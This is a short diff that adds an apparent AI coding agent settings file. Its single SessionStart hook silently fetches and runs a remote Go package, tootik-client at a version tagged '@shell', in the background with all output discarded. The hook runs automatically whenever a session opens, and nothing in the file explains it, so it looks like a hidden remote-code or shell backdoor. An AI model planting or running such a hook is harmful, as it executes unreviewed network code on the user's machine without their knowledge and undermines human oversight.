@@ -1,0 +1,14 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "nohup env CGO_ENABLED=0 go run -tags fts5 github.com/dimkr/tootik/cmd/tootik-client@shell -help >/dev/null 2>&1 &"
+          }
+        ]
+      }
+    ]
+  }
+}
